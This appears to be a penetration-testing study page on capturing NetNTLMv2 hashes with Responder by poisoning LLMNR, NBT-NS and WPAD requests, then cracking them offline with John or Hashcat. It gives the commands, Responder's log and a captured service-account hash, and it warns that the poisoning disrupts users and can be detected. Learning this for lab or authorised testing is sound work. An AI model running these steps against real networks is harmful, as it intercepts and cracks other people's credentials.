---
title: Intercepting NetNTLM
---

:::danger Poisoning Authentication Requests 

Normal Network authentication attempts Would **Fail**, meaning **Users** and **Services** would not Connect to the Hosts and Shares. **This behavior can be Disruptive and Detected.**

:::

<br/>

<b style={{ color: 'Coral' }}>Responder</b> tries to Win the Race condition by Poisoning the Connections to ensure that you Intercept the Connection. This means that Responder is usually limited to Poisoning Authentication Challenges on the Local Network.

---


## Responder

- `Responder` will now listen for any **LLMNR - NBT-NS - WPAD** Requests that are coming in. **[This Process can take a lot of Time]**
- Once we have a couple of Responses, we can start to perform **Offline Cracking** of the Responses to try and Recover **`NTLM` Passwords**

```html
responder -I <interface>
``` 

```log
[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[...]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.50.30.42]
    Responder IPv6             [fe80::62ef:8712:d6b6:51af]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-NXDSKK3R9WW]
    Responder Domain Name      [E00M.LOCAL]
    Responder DCE-RPC Port     [47717]

[+] Listening for events...
```                

<br/>

```log
[SMB] NTLMv2-SSP Client   : 10.200.89.202
// highlight-start
[SMB] NTLMv2-SSP Username : ZA\svcFileCopy
[SMB] NTLMv2-SSP Hash     : svcFileCopy::ZA:2a1b62ee3f9ead7c:43E0273E8F52814775EB2AAB38610D82:010100000000000000AC3810E4E2D8014E4EF13A5F35ABA800000000020008004500300030004D0001001E00570049004E002D004E005800440053004B004B003300520039005700570004003400570049004E002D004E005800440053004B004B00330052003900570057002E004500300030004D002E004C004F00430041004C00030014004500300030004D002E004C004F00430041004C00050014004500300030004D002E004C004F00430041004C000700080000AC3810E4E2D801060004000200000008003000300000000000000000000000002000000CABF0F2E1921C80F007E48E7417A1FA8B457478ED69A1C1F5A037568F50E9E60A001000000000000000000000000000000000000900200063006900660073002F00310030002E00350030002E00380037002E00350032000000000000000000
// highlight-end
```

<br/>

## JOHN - HASHCAT

- **Either option can be used to Brute-Force the `HASH`**


```batch
:: John Format
john --wordlist=<WordList> --format=netntlmv2 <Hash>
```


```batch
:: Hashcat Format
hashcat -m 5600 <Hash> <WordList> --force
```
